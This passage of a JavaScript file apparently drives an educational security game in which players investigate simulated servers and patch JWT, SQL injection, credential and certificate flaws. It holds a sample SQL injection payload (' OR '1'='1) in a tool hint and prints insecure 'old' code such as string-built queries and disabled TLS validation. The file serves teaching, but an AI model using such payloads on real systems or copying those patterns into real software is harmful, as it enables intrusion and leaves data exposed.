/* global confirm */
import { LEVELS, LEVEL_ORDER } from "./levels.js";
import { getNetworkForLevel } from "./networks.js";
import {
  JWTDecoder,
  SQLInjectionTester,
  CertificateValidator,
} from "./tools.js";
import { COMMAND_IDS, STORAGE_KEYS } from "./constants.js";
import { getLevelAndToolCommands } from "./levelHandlers.js";

// Game State
const gameState = {
  currentLevel: null,
  currentNode: null,
  networkNodes: [],
  scannedNodes: new Set(),
  cluesFound: new Set(),
  vulnerabilitiesFixed: new Set(),
  completedLevels: new Set(),
  inProgress: false,
};

// DOM Elements
let levelSelectionEl,
  levelListEl,
  gameScreenEl,
  levelInfoEl,
  progressInfoEl,
  backButtonEl;
let networkMapEl,
  terminalOutputEl,
  availableCommandsEl;
let npcInfoEl, talkButtonEl;
let dialogModal, dialogNPC, dialogBody, dialogClose, dialogContinue;
let victoryModal, nextLevelBtn, backToLevelsBtn;
let toolModal, toolTitle, toolInput, toolInputLabel, toolOutput, toolClose, toolExecute;

// Initialize Game
function init() {
  // Get DOM elements
  levelSelectionEl = document.getElementById("levelSelection");
  levelListEl = document.getElementById("levelList");
  gameScreenEl = document.getElementById("gameScreen");
  levelInfoEl = document.getElementById("levelInfo");
  progressInfoEl = document.getElementById("progressInfo");
  backButtonEl = document.getElementById("backButton");

  networkMapEl = document.getElementById("networkMap");
  terminalOutputEl = document.getElementById("terminalOutput");
  availableCommandsEl = document.getElementById("availableCommands");
  npcInfoEl = document.getElementById("npcInfo");
  talkButtonEl = document.getElementById("talkButton");

  dialogModal = document.getElementById("dialogModal");
  dialogNPC = document.getElementById("dialogNPC");
  dialogBody = document.getElementById("dialogBody");
  dialogClose = document.getElementById("dialogClose");
  dialogContinue = document.getElementById("dialogContinue");

  victoryModal = document.getElementById("victoryModal");
  nextLevelBtn = document.getElementById("nextLevel");
  backToLevelsBtn = document.getElementById("backToLevels");

  toolModal = document.getElementById("toolModal");
  toolTitle = document.getElementById("toolTitle");
  toolInput = document.getElementById("toolInput");
  toolInputLabel = document.getElementById("toolInputLabel");
  toolOutput = document.getElementById("toolOutput");
  toolClose = document.getElementById("toolClose");
  toolExecute = document.getElementById("toolExecute");

  const resetButton = document.getElementById("resetButton");

  // Setup event listeners
  dialogClose.addEventListener("click", () => closeDialog());
  dialogContinue.addEventListener("click", () => closeDialog());
  nextLevelBtn.addEventListener("click", () => goToNextLevel());
  backToLevelsBtn.addEventListener("click", () => showLevelSelection());
  backButtonEl.addEventListener("click", () => showLevelSelection());
  talkButtonEl.addEventListener("click", () => talkToNPC());
  toolClose.addEventListener("click", () => closeTool());
  toolExecute.addEventListener("click", () => executeTool());
  resetButton.addEventListener("click", () => resetProgress());

  // Setup keyboard navigation
  setupKeyboardNavigation();

  // Load saved game state
  loadGameState();

  // Show level selection
  showLevelSelection();
}

// Save Game State
function saveGameState() {
  const saveData = {
    completedLevels: Array.from(gameState.completedLevels),
    timestamp: Date.now(),
  };
  localStorage.setItem(STORAGE_KEYS.GAME_SAVE, JSON.stringify(saveData));
}

// Load Game State
function loadGameState() {
  try {
    const saved = localStorage.getItem(STORAGE_KEYS.GAME_SAVE);
    if (saved) {
      const data = JSON.parse(saved);
      data.completedLevels.forEach(id => gameState.completedLevels.add(id));
    }
  } catch (e) {
    console.error("Failed to load save data:", e);
  }
}

// Reset Progress
function resetProgress() {
  if (confirm('⚠️ Reset all progress?\n\nThis will delete your save data and cannot be undone.')) {
    localStorage.removeItem(STORAGE_KEYS.GAME_SAVE);
    gameState.completedLevels.clear();
    renderLevelList();
    addTerminalLine("Progress reset successfully.", "success");
  }
}

// Setup Keyboard Navigation
function setupKeyboardNavigation() {
  document.addEventListener('keydown', (e) => {
    // Escape - close modals
    if (e.key === 'Escape') {
      if (dialogModal.classList.contains('show')) {
        closeDialog();
        return;
      }
      if (victoryModal.classList.contains('show')) {
        showLevelSelection();
        return;
      }
      if (toolModal.classList.contains('show')) {
        closeTool();
        return;
      }
    }

    // Enter - activate focused element
    if (e.key === 'Enter') {
      const focused = document.activeElement;

      // Level card selection
      if (focused.classList.contains('level-card') && !focused.classList.contains('locked')) {
        focused.click();
        return;
      }

      // Command button activation
      if (focused.classList.contains('command-btn') && !focused.disabled) {
        focused.click();
        return;
      }

      // Network node selection
      if (focused.classList.contains('network-node')) {
        focused.click();
        return;
      }
    }

    // Arrow keys - navigate level cards when on level selection screen
    if (levelSelectionEl.style.display !== 'none') {
      const levelCards = Array.from(document.querySelectorAll('.level-card:not(.locked)'));
      const currentIndex = levelCards.indexOf(document.activeElement);

      if (e.key === 'ArrowRight' && currentIndex >= 0 && currentIndex < levelCards.length - 1) {
        levelCards[currentIndex + 1].focus();
        e.preventDefault();
      } else if (e.key === 'ArrowLeft' && currentIndex > 0) {
        levelCards[currentIndex - 1].focus();
        e.preventDefault();
      } else if ((e.key === 'ArrowRight' || e.key === 'ArrowDown') && currentIndex === -1 && levelCards.length > 0) {
        // No card focused, focus first one
        levelCards[0].focus();
        e.preventDefault();
      }
    }

    // Arrow keys - navigate network nodes when in game
    if (gameScreenEl.style.display !== 'none') {
      const nodes = Array.from(document.querySelectorAll('.network-node'));
      const currentIndex = nodes.indexOf(document.activeElement);

      if (e.key === 'ArrowDown' && currentIndex >= 0 && currentIndex < nodes.length - 1) {
        nodes[currentIndex + 1].focus();
        e.preventDefault();
      } else if (e.key === 'ArrowUp' && currentIndex > 0) {
        nodes[currentIndex - 1].focus();
        e.preventDefault();
      } else if ((e.key === 'ArrowDown' || e.key === 'ArrowRight') && currentIndex === -1 && nodes.length > 0) {
        // No node focused, focus first one
        nodes[0].focus();
        e.preventDefault();
      }
    }
  });
}

// Show Level Selection Screen
function showLevelSelection() {
  levelSelectionEl.style.display = "block";
  gameScreenEl.style.display = "none";
  victoryModal.classList.remove("show");
  renderLevelList();
}

// Render Level Selection
function renderLevelList() {
  levelListEl.innerHTML = "";

  LEVEL_ORDER.forEach((levelId, index) => {
    const level = LEVELS[levelId];
    const isLocked = index > 0 && !gameState.completedLevels.has(LEVEL_ORDER[index - 1]);
    const isCompleted = gameState.completedLevels.has(levelId);

    const card = document.createElement("div");
    card.className = `level-card ${isLocked ? "locked" : ""}`;

    // Make keyboard accessible
    if (!isLocked) {
      card.tabIndex = 0;
      card.setAttribute('role', 'button');
      card.setAttribute('aria-label', `Start level ${level.id}: ${level.name}`);
    }

    card.innerHTML = `
      <div class="level-card-header">
        <span class="level-number">Level ${level.id}</span>
        <span class="level-difficulty difficulty-${level.difficulty.toLowerCase()}">
          ${level.difficulty}
        </span>
      </div>
      <div class="level-name">${level.name}</div>
      <div class="level-description">${level.description}</div>
      <div class="level-concepts">
        ${level.concepts.map((c) => `<span class="concept-tag">${c}</span>`).join("")}
      </div>
      ${isCompleted ? '<div style="margin-top: 15px; color: var(--accent-green);">✅ Completed</div>' : ""}
      ${isLocked ? '<div style="margin-top: 15px; color: var(--text-secondary);">🔒 Complete previous levels to unlock</div>' : ""}
    `;

    if (!isLocked) {
      card.addEventListener("click", () => startLevel(levelId));
    }

    levelListEl.appendChild(card);
  });
}

// Start a Level
function startLevel(levelId) {
  gameState.currentLevel = LEVELS[levelId];
  gameState.networkNodes = JSON.parse(JSON.stringify(getNetworkForLevel(levelId))); // Deep copy
  gameState.currentNode = null;
  gameState.scannedNodes = new Set();
  gameState.cluesFound = new Set();
  gameState.vulnerabilitiesFixed = new Set();
  gameState.inProgress = true;

  levelSelectionEl.style.display = "none";
  gameScreenEl.style.display = "block";

  levelInfoEl.textContent = `Level ${gameState.currentLevel.id}: ${gameState.currentLevel.name}`;
  updateProgressInfo();

  // Initialize terminal
  terminalOutputEl.innerHTML = "";
  addTerminalLine("NetGuard Security Terminal v2.0", "");
  addTerminalLine("Bastion host: security-workstation.techcorp.local", "");
  addTerminalLine("---", "");
  addTerminalLine("🎯 MISSION BRIEFING:", "narrative");
  addTerminalLine(gameState.currentLevel.description, "narrative");
  addTerminalLine("", "");
  addTerminalLine("LEARNING OBJECTIVES:", "info");
  gameState.currentLevel.concepts.forEach((concept) => {
    addTerminalLine(`• ${concept}`, "info");
  });
  addTerminalLine("---", "");
  addTerminalLine("Click a node on the network map to SSH into it.", "info");
  addTerminalLine("Use available commands to investigate and analyze systems.", "info");

  renderNetworkMap();
  renderCommands();
}

// Update Progress Info
function updateProgressInfo() {
  const cluesFound = gameState.cluesFound.size;
  const totalClues = gameState.currentLevel.requiredClues.length;
  const vulnsFixed = gameState.vulnerabilitiesFixed.size;
  const totalVulns = gameState.currentLevel.vulnerabilities.length;

  progressInfoEl.textContent = `Clues: ${cluesFound}/${totalClues} | Vulnerabilities Fixed: ${vulnsFixed}/${totalVulns}`;
}

// Render Network Map
function renderNetworkMap() {
  networkMapEl.innerHTML = "";

  gameState.networkNodes.forEach((node) => {
    const nodeEl = document.createElement("div");
    nodeEl.className = `network-node ${node.status}`;
    if (gameState.currentNode === node.id) {
      nodeEl.classList.add("selected");
    }

    // Make keyboard accessible
    nodeEl.tabIndex = 0;
    nodeEl.setAttribute('role', 'button');
    nodeEl.setAttribute('aria-label', `Connect to ${node.name} - ${node.description}`);

    nodeEl.innerHTML = `
      <div class="node-header">
        <div class="node-name">${node.name}</div>
        <div class="status-indicator">${getStatusEmoji(node.status)}</div>
      </div>
      <div class="node-type">${node.type}</div>
      <div class="node-description">${node.description}</div>
    `;

    nodeEl.addEventListener("click", () => selectNode(node.id));
    networkMapEl.appendChild(nodeEl);
  });
}

// Get Status Emoji
function getStatusEmoji(status) {
  const statusMap = {
    healthy: "🟢",
    suspicious: "🟡",
    compromised: "🔴",
    unexamined: "🔵",
  };
  return statusMap[status] || "🔵";
}

// Select Node (SSH into it)
function selectNode(nodeId) {
  const node = gameState.networkNodes.find((n) => n.id === nodeId);
  const wasConnected = gameState.currentNode !== null;

  // If already connected to a different node, disconnect first
  if (wasConnected && gameState.currentNode !== nodeId) {
    addTerminalLine("", "");
    addTerminalLine("Connection closed.", "info");
    addTerminalLine("---", "");
  }

  gameState.currentNode = nodeId;

  // SSH connection message (don't use "command" class as it adds extra $)
  addTerminalLine(`$ ssh user@${node.hostname}`, "");
  addTerminalLine(`Connecting to ${node.hostname}...`, "info");
  addTerminalLine(
    `Warning: Permanently added '${node.hostname}' (ED25519) to the list of known hosts.`,
    "info"
  );
  addTerminalLine(`user@${node.hostname}'s password: ********`, "");
  addTerminalLine(`Last login: ${getLastLoginDate()}`, "");
  addTerminalLine("", "");
  addTerminalLine(`Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-86-generic x86_64)`, "");
  addTerminalLine("", "");
  addTerminalLine(`System load:  0.${Math.floor(Math.random() * 50 + 10)}`, "");
  addTerminalLine(`Memory usage: ${Math.floor(Math.random() * 30 + 20)}%`, "");
  addTerminalLine(`Processes:    ${Math.floor(Math.random() * 200 + 100)}`, "");
  addTerminalLine("", "");

  updateNPCPanel(node);
  renderNetworkMap();
  renderCommands();
  scrollTerminalToBottom();
}

// Get a realistic last login date
function getLastLoginDate() {
  const dates = [
    "Mon Nov 11 08:42:33 2024",
    "Fri Nov  8 14:23:11 2024",
    "Thu Nov  7 09:15:47 2024",
    "Wed Nov  6 16:32:09 2024",
  ];
  return dates[Math.floor(Math.random() * dates.length)];
}

// Update NPC Panel
function updateNPCPanel(node) {
  if (node && node.npc) {
    npcInfoEl.textContent = node.npc.name;
    talkButtonEl.disabled = false;
    talkButtonEl.textContent = "Talk to Personnel";
  } else {
    npcInfoEl.textContent = "No personnel available at this location";
    talkButtonEl.disabled = true;
  }
}

// Render Commands
function renderCommands() {
  availableCommandsEl.innerHTML = "";

  const commands = getAvailableCommands();

  commands.forEach((cmd) => {
    const button = document.createElement("button");
    button.className = "command-button";
    button.textContent = cmd.name;
    button.title = cmd.description;

    if (cmd.disabled) {
      button.disabled = true;
    }

    button.addEventListener("click", () => executeCommand(cmd.id));
    availableCommandsEl.appendChild(button);
  });
}

// Get Available Commands based on current state and level
function getAvailableCommands() {
  const baseCommands = [
    {
      id: COMMAND_IDS.LS,
      name: "ls -la",
      description: "List files and directories",
      disabled: !gameState.currentNode,
    },
    {
      id: COMMAND_IDS.PWD,
      name: "pwd",
      description: "Print working directory",
      disabled: !gameState.currentNode,
    },
    {
      id: COMMAND_IDS.WHOAMI,
      name: "whoami",
      description: "Display current user",
      disabled: !gameState.currentNode,
    },
    {
      id: COMMAND_IDS.SCAN,
      name: "systemctl status",
      description: "Check service status and system info",
      disabled: !gameState.currentNode,
    },
    {
      id: COMMAND_IDS.LOGS,
      name: "tail -f /var/log/system.log",
      description: "Review system logs",
      disabled: !gameState.currentNode,
    },
    {
      id: COMMAND_IDS.EXIT,
      name: "exit",
      description: "Disconnect from current host",
      disabled: !gameState.currentNode,
    },
  ];

  // Get level-specific and tool commands from handlers
  const levelCommands = getLevelAndToolCommands(gameState);

  return [...baseCommands, ...levelCommands];
}

// Execute Command
function executeCommand(commandId) {
  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode);
  const cmd = getAvailableCommands().find((c) => c.id === commandId);

  if (cmd.disabled) {
    addTerminalLine(
      `${cmd.name}: command not available in current context`,
      "error"
    );
    return;
  }

  // Show command without extra $ prefix (addTerminalLine with "command" class adds it)
  addTerminalLine(cmd.name, "command");

  switch (commandId) {
    case "ls":
      listFiles(node);
      break;
    case "pwd":
      printWorkingDirectory();
      break;
    case "whoami":
      showCurrentUser();
      break;
    case "scan":
      scanNode(node);
      break;
    case "logs":
      checkLogs(node);
      break;
    case "analyze-tokens":
      analyzeTokens(node);
      break;
    case "view-source":
      viewSource(node);
      break;
    case "check-cert":
      checkCertificate(node);
      break;
    case "decode-jwt":
      openTool("echo <token> | base64 -d");
      break;
    case "test-sql":
      openTool("psql -c");
      break;
    case "check-cert-tool":
      openTool("openssl x509 -text");
      break;
    case "fix-jwt":
      fixJWTExpiration();
      break;
    case "fix-sql":
      fixSQLInjection();
      break;
    case "fix-secrets":
      rotateCredentials();
      break;
    case "fix-cert":
      enableCertValidation();
      break;
    case "analyze-csrf":
      analyzeCSRF();
      break;
    case "fix-csrf":
      fixCSRF();
      break;
    case "analyze-xss":
      analyzeXSS();
      break;
    case "fix-xss":
      fixXSS();
      break;
    case "add-csp":
      addCSP();
      break;
    case "check-auth":
      checkAuth();
      break;
    case "fix-auth":
      fixAuth();
      break;
    case "fix-session":
      fixSession();
      break;
    case "analyze-api":
      analyzeAPI();
      break;
    case "add-rate-limit":
      addRateLimit();
      break;
    case "fix-idor":
      fixIDOR();
      break;
    case "fix-data-exposure":
      fixDataExposure();
      break;
    case "exit":
      disconnectNode();
      break;
  }

  scrollTerminalToBottom();
  updateProgressInfo();
  renderCommands();
}

// List Files
function listFiles(node) {
  addTerminalLine("total 48", "");
  addTerminalLine("drwxr-xr-x  5 user user 4096 Nov 11 08:23 .", "");
  addTerminalLine("drwxr-xr-x 24 root root 4096 Nov  1 10:15 ..", "");
  addTerminalLine("-rw-r--r--  1 user user  220 Nov  1 10:15 .bash_logout", "");
  addTerminalLine("-rw-r--r--  1 user user 3526 Nov  1 10:15 .bashrc", "");
  addTerminalLine("-rw-r--r--  1 user user  807 Nov  1 10:15 .profile", "");
  addTerminalLine("drwxr-xr-x  3 user user 4096 Nov 11 08:23 .config", "");

  if (node.sourceCode) {
    addTerminalLine("-rw-r--r--  1 user user 2840 Nov 10 14:32 source.js", "");
  }
  if (node.type === "auth") {
    addTerminalLine("-rwxr-xr-x  1 user user 1024 Nov  1 10:20 analyze-tokens.sh", "success");
  }
  addTerminalLine("", "");
}

// Print Working Directory
function printWorkingDirectory() {
  addTerminalLine(`/home/user`, "");
  addTerminalLine("", "");
}

// Show Current User
function showCurrentUser() {
  addTerminalLine("user", "");
  addTerminalLine("", "");
}

// Scan Node
function scanNode(node) {
  if (gameState.scannedNodes.has(node.id)) {
    addTerminalLine("System already scanned. Use other commands for details.", "info");
    return;
  }

  gameState.scannedNodes.add(node.id);

  // Simulate systemctl status output
  addTerminalLine(`● ${node.type}.service - ${node.name}`, "");
  addTerminalLine(`   Loaded: loaded (/etc/systemd/system/${node.type}.service; enabled)`, "");
  addTerminalLine(`   Active: active (running)`, "success");
  addTerminalLine(`   Main PID: ${Math.floor(Math.random() * 50000 + 1000)}`, "");
  addTerminalLine("", "");
  addTerminalLine(node.scanResult, "");
  addTerminalLine("", "");

  if (node.status === "unexamined") {
    node.status = "healthy";
  }

  renderNetworkMap();
}

// Check Logs
function checkLogs(node) {
  addTerminalLine(node.logs, node.clue ? "warning" : "");
  addTerminalLine("", "");

  // Add clue if this node has one
  if (node.clue && !gameState.cluesFound.has(node.clue)) {
    gameState.cluesFound.add(node.clue);
    const clueDesc = gameState.currentLevel.clueDescriptions[node.clue];
    addTerminalLine(`🔍 CLUE FOUND: ${clueDesc}`, "success");
    addTerminalLine(
      `Clues discovered: ${gameState.cluesFound.size}/${gameState.currentLevel.requiredClues.length}`,
      "info"
    );
    addTerminalLine("", "");

    if (node.id === "auth" && node.clue === "auth_config") {
      addTerminalLine("Try running ./analyze-tokens.sh to investigate further", "info");
      node.status = "suspicious";
      renderNetworkMap();
    }
  }
}

// Analyze Tokens (Level 1)
function analyzeTokens(node) {
  if (!node.tokenData) {
    addTerminalLine("No token data available.", "info");
    return;
  }

  // Check if player has found enough clues
  const hasRequiredClues = node.tokenData.requiresClues.every((clue) =>
    gameState.cluesFound.has(clue)
  );

  if (!hasRequiredClues) {
    const missingClues = node.tokenData.requiresClues.filter(
      (clue) => !gameState.cluesFound.has(clue)
    );
    addTerminalLine("Running token analysis...", "info");
    addTerminalLine("---", "");
    addTerminalLine("Found several active JWT tokens with valid signatures.", "");
    addTerminalLine("Token claims include standard fields: sub, iat, exp, role.", "");
    addTerminalLine("---", "");
    addTerminalLine("⚠️ Need more context to identify issues.", "warning");
    addTerminalLine(
      "Hint: Investigate other systems to gather clues about suspicious activity.",
      "info"
    );
    const missingDesc = missingClues.map((c) => gameState.currentLevel.clueDescriptions[c]);
    addTerminalLine(`Missing clues: ${missingDesc.join(", ")}`, "info");
    return;
  }

  addTerminalLine("Running comprehensive token analysis...", "info");
  addTerminalLine("---", "");
  addTerminalLine(node.tokenData.details, "error");
  addTerminalLine("---", "");
  addTerminalLine("🔴 VULNERABILITY IDENTIFIED!", "error");
  addTerminalLine("An expired contractor token is still being accepted.", "error");
  addTerminalLine("---", "");
  addTerminalLine("SECURITY LESSON:", "info");
  addTerminalLine(node.tokenData.solution, "info");
  addTerminalLine("---", "");
  addTerminalLine("Run enable-jwt-expiration to fix this vulnerability.", "warning");

  if (node.sampleToken) {
    addTerminalLine("", "");
    addTerminalLine(
      `Sample token available. Use the decode command to analyze it manually.`,
      "info"
    );
  }

  // Mark that vulnerability has been identified and understood
  gameState.vulnerabilityFound = true;
  node.status = "compromised";
  renderNetworkMap();
  renderCommands(); // Re-render to enable fix-jwt button
}

// View Source Code (Level 2)
function viewSource(node) {
  if (!node.sourceCode) {
    addTerminalLine("No source code available at this location.", "info");
    return;
  }

  addTerminalLine(`Viewing source code...`, "info");
  addTerminalLine("---", "");
  addTerminalLine(node.sourceCode, "");
  addTerminalLine("---", "");

  // Add clue if present
  if (node.clue && !gameState.cluesFound.has(node.clue)) {
    gameState.cluesFound.add(node.clue);
    const clueDesc = gameState.currentLevel.clueDescriptions[node.clue];
    addTerminalLine(`🔍 CLUE FOUND: ${clueDesc}`, "success");
    addTerminalLine(
      `Clues discovered: ${gameState.cluesFound.size}/${gameState.currentLevel.requiredClues.length}`,
      "info"
    );

    if (node.clue === "source_code_secrets") {
      addTerminalLine("⚠️ CRITICAL: Hardcoded credentials found in source!", "error");
      addTerminalLine(
        "Secrets should NEVER be committed to version control.",
        "warning"
      );
      addTerminalLine("Use environment variables or secret management systems.", "info");
      node.status = "compromised";
      renderNetworkMap();
    }

    if (node.clue === "injectable_endpoint") {
      addTerminalLine("⚠️ SQL Injection vulnerability detected!", "error");
      addTerminalLine(
        "User input is directly concatenated into SQL queries.",
        "warning"
      );
      addTerminalLine(
        "Use 'tools' command and sql-inject to test exploitation.",
        "info"
      );
      node.status = "compromised";
      renderNetworkMap();
    }
  }
}

// Check Certificate (Level 3)
function checkCertificate(node) {
  if (!node.certificate) {
    addTerminalLine("Certificate information:", "info");
    addTerminalLine(node.logs, "");
    return;
  }

  const cert = node.certificate;
  addTerminalLine("Analyzing SSL/TLS certificate...", "info");
  addTerminalLine("---", "");
  addTerminalLine(`Subject: ${cert.subject}`, "");
  addTerminalLine(`Issuer: ${cert.issuer}`, "");
  addTerminalLine(`Valid from: ${cert.notBefore}`, "");
  addTerminalLine(`Valid to: ${cert.notAfter}`, "");
  addTerminalLine("---", "");

  if (cert.selfSigned) {
    addTerminalLine("⚠️ CRITICAL: Self-signed certificate detected!", "error");
    addTerminalLine(
      "Self-signed certificates should not be trusted in production!",
      "error"
    );
    addTerminalLine("---", "");
    addTerminalLine("SECURITY LESSON:", "info");
    addTerminalLine(
      "Self-signed certificates bypass the certificate trust chain.",
      "info"
    );
    addTerminalLine(
      "An attacker can create their own self-signed cert for man-in-the-middle attacks.",
      "info"
    );
    addTerminalLine(
      "Always validate certificates against trusted Certificate Authorities.",
      "info"
    );
    addTerminalLine("---", "");
    addTerminalLine(
      "Use 'tools' command and cert-check to analyze certificates interactively.",
      "info"
    );

    node.status = "compromised";
    renderNetworkMap();
  }

  // Add clue if present
  if (node.clue && !gameState.cluesFound.has(node.clue)) {
    gameState.cluesFound.add(node.clue);
    const clueDesc = gameState.currentLevel.clueDescriptions[node.clue];
    addTerminalLine(`🔍 CLUE FOUND: ${clueDesc}`, "success");
  }
}

// Open Interactive Tool
function openTool(toolName) {
  toolTitle.textContent = toolName;
  toolInput.value = "";
  toolOutput.textContent = "";

  // Set context-specific hints
  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode);

  if (toolName.includes("base64") && node?.sampleToken) {
    toolInputLabel.textContent = "JWT Token (paste parts separated by dots):";
    toolInput.placeholder = "Paste JWT header or payload (base64 encoded)...";
    toolInput.value = node.sampleToken.split(".")[1]; // Payload part
    toolOutput.textContent = "Hint: JWT tokens have 3 parts (header.payload.signature). Paste the middle part to see the payload.";
  } else if (toolName.includes("psql")) {
    toolInputLabel.textContent = "SQL Query:";
    toolInput.placeholder = "e.g., SELECT * FROM users WHERE id = '1' OR '1'='1'";
    toolOutput.textContent =
      "Try SQL injection payloads to see how they exploit vulnerabilities.\nExample: ' OR '1'='1";
  } else if (toolName.includes("openssl")) {
    toolInputLabel.textContent = "Certificate Data (JSON):";
    toolInput.placeholder = '{"subject": "...", "issuer": "...", ...}';
    if (node?.certificate) {
      toolInput.value = JSON.stringify(node.certificate, null, 2);
      toolOutput.textContent = "Certificate from current system loaded.";
    }
  }

  toolModal.classList.add("show");
}

// Close Tool Modal
function closeTool() {
  toolModal.classList.remove("show");
}

// Execute Interactive Tool
function executeTool() {
  const toolName = toolTitle.textContent;
  const input = toolInput.value.trim();

  if (!input) {
    toolOutput.textContent = "Error: Input is required";
    return;
  }

  toolOutput.textContent = "Processing...\n";

  setTimeout(() => {
    try {
      if (toolName.includes("base64")) {
        const decoded = JWTDecoder.decode("header." + input + ".signature");
        toolOutput.textContent = JWTDecoder.formatDecoded(decoded);
      } else if (toolName.includes("psql")) {
        const originalQuery = "SELECT * FROM users WHERE id = '?'";
        const result = SQLInjectionTester.testPayload(input, originalQuery);

        if (result.vulnerable) {
          toolOutput.textContent = result.explanation + "\n\n" + result.fix;
        } else {
          toolOutput.textContent = result.message;
        }
      } else if (toolName.includes("openssl")) {
        let certData;
        try {
          certData = JSON.parse(input);
        } catch {
          const sampleCert = {
            subject: "example.com",
            issuer: "TrustedCA",
            notBefore: "2024-01-01T00:00:00Z",
            notAfter: "2025-12-31T00:00:00Z",
          };
          toolOutput.textContent = `Error: Invalid JSON format\n\nPlease enter valid JSON. Example:\n${JSON.stringify(sampleCert, null, 2)}`;
          return;
        }

        // Validate required fields
        if (!certData.subject || !certData.issuer || !certData.notBefore || !certData.notAfter) {
          toolOutput.textContent = "Error: Certificate data missing required fields.\n\nRequired: subject, issuer, notBefore, notAfter";
          return;
        }

        const validation = CertificateValidator.validate(certData);

        let output = `Certificate Validation Results\n${"=".repeat(50)}\n\n`;
        output += `Status: ${validation.valid ? "✅ VALID" : "❌ INVALID"}\n`;
        output += `${validation.summary}\n\n`;

        if (validation.issues.length > 0) {
          output += "Issues Found:\n";
          validation.issues.forEach((issue, i) => {
            output += `\n${i + 1}. [${issue.severity}] ${issue.issue}\n`;
            output += `   ${issue.explanation}\n`;
            if (issue.risk) {
              output += `   Risk: ${issue.risk}\n`;
            }
          });
        }

        toolOutput.textContent = output;
      }
    } catch (err) {
      toolOutput.textContent = `Error: ${err.message}`;
    }
  }, 500);
}

// Fix JWT Expiration (Level 1)
function fixJWTExpiration() {
  if (gameState.vulnerabilitiesFixed.has("jwt_expiration")) {
    addTerminalLine("JWT expiration validation already enabled.", "info");
    return;
  }

  addTerminalLine("Connecting to auth-service-01.techcorp.local...", "info");
  addTerminalLine("Updating JWT middleware configuration...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Enabled expiration validation in jwt.config.js", "success");
  addTerminalLine("✅ Restarted authentication service", "success");
  addTerminalLine("✅ Testing token validation...", "success");
  addTerminalLine("✅ Expired tokens now rejected", "success");
  addTerminalLine("✅ Contractor access revoked", "success");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Vulnerability patched successfully!", "success");

  gameState.vulnerabilitiesFixed.add("jwt_expiration");

  const authNode = gameState.networkNodes.find((n) => n.id === "auth");
  if (authNode) authNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Fix SQL Injection (Level 2)
function fixSQLInjection() {
  if (gameState.vulnerabilitiesFixed.has("sql_injection")) {
    addTerminalLine("SQL injection vulnerability already fixed.", "info");
    return;
  }

  addTerminalLine("Patching SQL injection vulnerability...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Replaced string concatenation with parameterized queries", "success");
  addTerminalLine("✅ Updated all affected endpoints", "success");
  addTerminalLine("✅ Added input validation", "success");
  addTerminalLine("✅ Deployed to production", "success");
  addTerminalLine("---", "");
  addTerminalLine("PATCH APPLIED:", "info");
  addTerminalLine(`
// ❌ OLD (VULNERABLE):
const query = "SELECT * FROM users WHERE id = '" + userId + "'";

// ✅ NEW (SECURE):
const query = "SELECT * FROM users WHERE id = ?";
db.execute(query, [userId]);`, "");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ SQL injection vulnerability fixed!", "success");

  gameState.vulnerabilitiesFixed.add("sql_injection");

  const apiNode = gameState.networkNodes.find((n) => n.id === "api-server");
  if (apiNode) apiNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Rotate Credentials (Level 2)
function rotateCredentials() {
  if (gameState.vulnerabilitiesFixed.has("hardcoded_credentials")) {
    addTerminalLine("Credentials already rotated.", "info");
    return;
  }

  addTerminalLine("Rotating hardcoded credentials...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Generated new database password", "success");
  addTerminalLine("✅ Updated environment variables", "success");
  addTerminalLine("✅ Removed secrets from source code", "success");
  addTerminalLine("✅ Committed security fix to repo", "success");
  addTerminalLine("✅ Invalidated old credentials", "success");
  addTerminalLine("---", "");
  addTerminalLine("SECURITY BEST PRACTICES:", "info");
  addTerminalLine("• Never commit secrets to version control", "info");
  addTerminalLine("• Use environment variables or secret management systems", "info");
  addTerminalLine("• Rotate credentials regularly", "info");
  addTerminalLine("• Use different credentials for each environment", "info");
  addTerminalLine("---", "");
  addTerminalLine("🛡️ Credentials secured!", "success");

  gameState.vulnerabilitiesFixed.add("hardcoded_credentials");

  const repoNode = gameState.networkNodes.find((n) => n.id === "repo");
  if (repoNode) repoNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Enable Certificate Validation (Level 3)
function enableCertValidation() {
  if (gameState.vulnerabilitiesFixed.has("cert_validation")) {
    addTerminalLine("Certificate validation already enabled.", "info");
    return;
  }

  addTerminalLine("Enabling certificate validation...", "info");
  addTerminalLine("---", "");
  addTerminalLine("✅ Removed NODE_TLS_REJECT_UNAUTHORIZED=0", "success");
  addTerminalLine("✅ Enabled rejectUnauthorized in HTTPS agent", "success");
  addTerminalLine("✅ Added proper CA certificate validation", "success");
  addTerminalLine("✅ Tested secure connection", "success");
  addTerminalLine("✅ Documented security requirements", "success");
  addTerminalLine("---", "");
  addTerminalLine("SECURITY FIX:", "info");
  addTerminalLine(`
// ❌ OLD (VULNERABLE):
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ✅ NEW (SECURE):
const agent = new https.Agent({
  rejectUnauthorized: true,  // Validate certificates
  ca: fs.readFileSync('trusted-ca.pem')  // Use trusted CA
});`, "");
  addTerminalLine("---", "");
  addTerminalLine(
    "Note: Requested external vendor to obtain proper CA-signed certificate.",
    "info"
  );
  addTerminalLine("🛡️ MITM vulnerability eliminated!", "success");

  gameState.vulnerabilitiesFixed.add("cert_validation");

  const proxyNode = gameState.networkNodes.find((n) => n.id === "payment-proxy");
  if (proxyNode) proxyNode.status = "healthy";

  renderNetworkMap();
  checkLevelComplete();
}

// Level 4: CSRF Functions
function analyzeCSRF() {
  addTerminalLine("Analyzing cross-origin request patterns...", "info");
  addTerminalLine("---", "");
  addTerminalLine("🔴 CSRF VULNERABILITY DETECTED!", "error");
  addTerminalLine("State-changing requests accept no CSRF tokens", "error");
  addTerminalLine("Malicious sites can forge requests using user's session", "error");
  addTerminalLine("---", "");
  addTerminalLine("SECURITY LESSON:", "info");
  addTerminalLine("CSRF attacks exploit browser behavior of automatically", "info");
  addTerminalLine("including cookies with requests. CSRF tokens prove", "info");
  addTerminalLine("requests originate from your application, not attackers.", "info");
